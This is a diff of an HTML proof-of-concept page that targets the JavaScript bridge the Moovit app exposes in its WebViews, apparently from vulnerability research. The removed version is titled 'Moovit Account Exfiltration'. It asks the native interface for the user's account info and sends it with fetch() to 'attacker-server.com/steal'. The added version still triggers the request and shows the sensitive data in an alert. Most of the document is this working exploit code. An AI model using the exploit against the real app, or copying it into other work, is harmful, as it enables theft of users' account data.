@@ -1,36 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Moovit Account Exfiltration</title>
+    <title>Moovit Interface Discovery</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background: #f0f0f0; }
+        .status { padding: 10px; border-radius: 5px; margin-bottom: 10px; }
+        .found { background: #d4edda; color: #155724; }
+        .missing { background: #f8d7da; color: #721c24; }
+    </style>
 </head>
 <body>
-    <h1>Exfiltrating Data...</h1>
-    <div id="log">Status: Initializing...</div>
+    <h1>Moovit JS Interface Test</h1>
+    <div id="mobile-status" class="status">Checking 'mobile' interface...</div>
+    <div id="moovit-status" class="status">Checking 'moovit' interface...</div>
 
     <script>
-        const logDiv = document.getElementById('log');
+        // 1. Verify 'mobile' interface (Available in WebViewActivity)
+        if (window.mobile) {
+            document.getElementById('mobile-status').className = "status found";
+            document.getElementById('mobile-status').innerText = "FOUND: 'mobile' interface";
+        } else {
+            document.getElementById('mobile-status').className = "status missing";
+            document.getElementById('mobile-status').innerText = "MISSING: 'mobile' interface";
+        }
 
-        // 1. Define the callback function that the native app will call
-        window.moovit = {
-            onAccountInfo: function(jsonString) {
-                const data = JSON.parse(jsonString);
-                logDiv.innerHTML = "<b>SUCCESS! Account Data Exfiltrated:</b><br>" + 
-                                   JSON.stringify(data, null, 2);
-                
-                // 3. Exfiltrate to attacker server
-                fetch('https://attacker-server.com/steal?data=' + encodeURIComponent(jsonString));
-            }
-        };
+        // 2. Verify 'moovit' interface (Available in Ticketing/Payments)
+        if (window.moovit) {
+            document.getElementById('moovit-status').className = "status found";
+            document.getElementById('moovit-status').innerText = "FOUND: 'moovit' interface";
+            
+            // Define callback for the sensitive data
+            window.moovit.onAccountInfo = function(jsonString) {
+                alert("SENSITIVE DATA RETRIEVED:\n" + jsonString);
+            };
 
-        // 2. Trigger the native interface
-        setTimeout(() => {
-            if (window.moovit && typeof window.moovit.requestAccountInfo === 'function') {
-                logDiv.innerText = "Status: Interface detected. Requesting data...";
-                window.moovit.requestAccountInfo();
-            } else {
-                logDiv.innerText = "Error: 'moovit' interface not found. This page must be loaded in the Ticketing WebView.";
-            }
-        }, 1000);
+            // Trigger data request
+            window.moovit.requestAccountInfo();
+        } else {
+            document.getElementById('moovit-status').className = "status missing";
+            document.getElementById('moovit-status').innerText = "MISSING: 'moovit' interface";
+        }
     </script>
 </body>
 </html>
